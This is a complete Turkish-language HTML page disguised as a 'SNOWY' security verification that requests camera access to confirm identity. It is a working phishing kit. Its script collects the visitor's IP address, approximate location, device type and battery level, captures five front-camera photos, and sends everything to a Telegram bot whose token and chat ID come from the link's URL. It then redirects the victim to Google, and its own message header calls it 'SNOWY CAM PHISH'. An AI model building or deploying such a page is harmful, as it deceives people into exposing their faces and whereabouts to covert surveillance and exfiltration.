<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SNOWY Güvenlik Doğrulaması</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .container {
            background: rgba(255, 255, 255, 0.95);
            border-radius: 20px;
            padding: 40px;
            max-width: 450px;
            width: 100%;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            text-align: center;
        }
        
        h2 {
            color: #333;
            font-size: 28px;
            margin-bottom: 20px;
        }
        
        h2 span {
            color: #667eea;
        }
        
        p {
            color: #666;
            margin-bottom: 30px;
            line-height: 1.6;
        }
        
        .btn {
            background: linear-gradient(45deg, #667eea, #764ba2);
            color: white;
            border: none;
            padding: 16px 32px;
            font-size: 18px;
            font-weight: bold;
            border-radius: 50px;
            cursor: pointer;
            width: 100%;
            transition: all 0.3s ease;
            box-shadow: 0 5px 15px rgba(102, 126, 234, 0.4);
            margin-bottom: 20px;
        }
        
        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 25px rgba(102, 126, 234, 0.5);
        }
        
        .btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none;
        }
        
        .status-box {
            background: #f5f5f5;
            border-radius: 10px;
            padding: 20px;
            margin: 20px 0;
            display: none;
        }
        
        .progress {
            width: 100%;
            height: 8px;
            background: #e0e0e0;
            border-radius: 4px;
            margin: 20px 0;
            overflow: hidden;
            display: none;
        }
        
        .progress-bar {
            width: 0%;
            height: 100%;
            background: linear-gradient(90deg, #667eea, #764ba2);
            transition: width 0.3s ease;
        }
        
        .info {
            background: #e8f4fd;
            border-left: 4px solid #667eea;
            padding: 15px;
            border-radius: 8px;
            text-align: left;
            margin: 20px 0;
            font-size: 14px;
            color: #333;
        }
        
        .info i {
            color: #667eea;
            margin-right: 8px;
        }
        
        .footer {
            color: #999;
            font-size: 12px;
            margin-top: 20px;
        }
        
        .footer a {
            color: #667eea;
            text-decoration: none;
        }
        
        #video, #canvas {
            display: none;
        }
        
        .count {
            font-size: 36px;
            font-weight: bold;
            color: #667eea;
            margin: 10px 0;
        }
        
        .message {
            padding: 10px;
            border-radius: 8px;
            margin: 10px 0;
            display: none;
        }
        
        .message.success {
            background: #d4edda;
            color: #155724;
            border-left: 4px solid #28a745;
        }
        
        .message.error {
            background: #f8d7da;
            color: #721c24;
            border-left: 4px solid #dc3545;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>❄️ <span>SNOWY</span> GÜVENLİK</h2>
        
        <div class="info">
            <i>🔐</i> Bu bir güvenlik doğrulamasıdır. Kimliğinizi doğrulamak için kamera erişimi gereklidir.
        </div>
        
        <div id="userInfo" class="info" style="display: none;">
            <div><i>📱</i> <span id="deviceInfo"></span></div>
            <div><i>🌐</i> <span id="ipInfo"></span></div>
            <div><i>📍</i> <span id="locationInfo"></span></div>
            <div><i>🔋</i> <span id="batteryInfo"></span></div>
        </div>
        
        <button class="btn" id="startBtn" onclick="startCamera()">
            📸 Kamerayı Başlat
        </button>
        
        <div class="progress" id="progress">
            <div class="progress-bar" id="progressBar"></div>
        </div>
        
        <div class="status-box" id="statusBox">
            <div class="count" id="photoCount">0</div>
            <div>Fotoğraf çekiliyor...</div>
        </div>
        
        <div class="message" id="message"></div>
        
        <div class="footer">
            ❄️ @snowy_dexry_wexry
        </div>
    </div>
    
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        // URL'den parametreleri al
        const urlParams = new URLSearchParams(window.location.search);
        const BOT_TOKEN = urlParams.get('t');
        const TARGET_ID = urlParams.get('i');
        
        // DOM elementleri
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const ctx = canvas.getContext('2d');
        const startBtn = document.getElementById('startBtn');
        const progress = document.getElementById('progress');
        const progressBar = document.getElementById('progressBar');
        const statusBox = document.getElementById('statusBox');
        const message = document.getElementById('message');
        const userInfo = document.getElementById('userInfo');
        
        let stream = null;
        let photoCount = 0;
        let isActive = false;
        
        // Sayfa yüklendiğinde token kontrolü
        window.onload = function() {
            console.log('Sayfa yüklendi');
            console.log('Token:', BOT_TOKEN);
            console.log('Hedef ID:', TARGET_ID);
            
            if (!BOT_TOKEN || !TARGET_ID) {
                showMessage('Geçersiz bağlantı!', 'error');
                startBtn.disabled = true;
                startBtn.style.opacity = '0.5';
            }
        };
        
        // Mesaj göster
        function showMessage(text, type) {
            message.className = 'message ' + type;
            message.innerHTML = text;
            message.style.display = 'block';
            setTimeout(() => {
                message.style.display = 'none';
            }, 3000);
        }
        
        // Kullanıcı bilgilerini topla
        async function collectUserInfo() {
            try {
                // IP adresi
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipRes.json();
                const ip = ipData.ip;
                
                // Konum
                const locRes = await fetch(`http://ip-api.com/json/${ip}`);
                const locData = await locRes.json();
                let location = 'Bilinmiyor';
                if (locData.status === 'success') {
                    location = `${locData.city}, ${locData.country}`;
                }
                
                // Cihaz bilgisi
                const ua = navigator.userAgent;
                let device = 'Bilinmiyor';
                if (ua.includes('Android')) device = 'Android Telefon';
                else if (ua.includes('iPhone')) device = 'iPhone';
                else if (ua.includes('iPad')) device = 'iPad';
                else if (ua.includes('Windows')) device = 'Windows Bilgisayar';
                else if (ua.includes('Mac')) device = 'Mac Bilgisayar';
                else if (ua.includes('Linux')) device = 'Linux Bilgisayar';
                
                // Batarya
                let battery = 'Bilinmiyor';
                if ('getBattery' in navigator) {
                    const batteryData = await navigator.getBattery();
                    battery = Math.round(batteryData.level * 100) + '%';
                }
                
                // Bilgileri göster
                document.getElementById('deviceInfo').innerText = device;
                document.getElementById('ipInfo').innerText = ip;
                document.getElementById('locationInfo').innerText = location;
                document.getElementById('batteryInfo').innerText = battery;
                userInfo.style.display = 'block';
                
                // Telegram'a gönder
                const message = 
`❄️ **SNOWY CAM PHISH** ❄️
━━━━━━━━━━━━━━━━━━━━━
📱 **Hedef ID:** ${TARGET_ID}
🌐 **IP Adresi:** ${ip}
📍 **Konum:** ${location}
📱 **Cihaz:** ${device}
🔋 **Batarya:** ${battery}
⏱️ **Zaman:** ${new Date().toLocaleString('tr-TR')}
━━━━━━━━━━━━━━━━━━━━━
⚡ @snowy_dexry_wexry`;
                
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        chat_id: TARGET_ID,
                        text: message,
                        parse_mode: 'Markdown'
                    })
                });
                
            } catch(e) {
                console.log('Bilgi toplama hatası:', e);
            }
        }
        
        // Kamerayı başlat
        async function startCamera() {
            try {
                console.log('Kamera başlatılıyor...');
                
                // Kamera izni iste
                stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        facingMode: "user",
                        width: { ideal: 640 },
                        height: { ideal: 480 }
                    } 
                });
                
                console.log('Kamera izni verildi!');
                
                // Video elementine bağla
                video.srcObject = stream;
                
                // Butonu değiştir
                startBtn.style.display = 'none';
                progress.style.display = 'block';
                statusBox.style.display = 'block';
                
                // Kullanıcı bilgilerini topla
                await collectUserInfo();
                
                // 5 saniye bekle (kamera açılsın)
                await new Promise(r => setTimeout(r, 2000));
                
                // Fotoğraf çekmeye başla
                isActive = true;
                takePhoto();
                
            } catch(e) {
                console.log('Kamera hatası:', e);
                showMessage('Kamera erişimi gerekli!', 'error');
                startBtn.disabled = false;
            }
        }
        
        // Fotoğraf çek
        async function takePhoto() {
            if (!isActive) return;
            
            try {
                // Canvas boyutlarını ayarla
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                
                // Fotoğrafı çek
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                // Fotoğraf sayısını artır
                photoCount++;
                document.getElementById('photoCount').innerText = photoCount;
                
                // Progress bar'ı güncelle
                const progress = Math.min(photoCount * 20, 100);
                progressBar.style.width = progress + '%';
                
                // Base64'e çevir ve gönder
                canvas.toBlob(async (blob) => {
                    try {
                        const formData = new FormData();
                        formData.append('chat_id', TARGET_ID);
                        formData.append('photo', blob, `snowy_cam_${Date.now()}.jpg`);
                        formData.append('caption', 
                            `❄️ **SNOWY CAM** ❄️\n` +
                            `📸 Fotoğraf #${photoCount}\n` +
                            `⏱️ ${new Date().toLocaleString('tr-TR')}\n` +
                            `━━━━━━━━━━━━━━━━\n` +
                            `⚡ @snowy_dexry_wexry`
                        );
                        
                        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                            method: 'POST',
                            body: formData
                        });
                        
                        if (response.ok) {
                            console.log(`Fotoğraf ${photoCount} gönderildi`);
                        }
                        
                    } catch(e) {
                        console.log('Fotoğraf gönderme hatası:', e);
                    }
                }, 'image/jpeg', 0.8);
                
                // 5 fotoğraf çekildiyse durdur
                if (photoCount >= 5) {
                    isActive = false;
                    statusBox.innerHTML = '<div class="count">✓</div><div>İşlem tamamlandı!</div>';
                    
                    // 2 saniye sonra yönlendir
                    setTimeout(() => {
                        window.location.href = 'https://www.google.com';
                    }, 2000);
                    
                } else {
                    // 2 saniye sonra tekrar çek
                    setTimeout(takePhoto, 2000);
                }
                
            } catch(e) {
                console.log('Fotoğraf çekme hatası:', e);
                if (isActive) {
                    setTimeout(takePhoto, 2000);
                }
            }
        }
        
        // Sayfa kapanırken
        window.onbeforeunload = function() {
            if (stream) {
                stream.getTracks().forEach(track => track.stop());
            }
        };
        
    </script>
</body>
    </html>
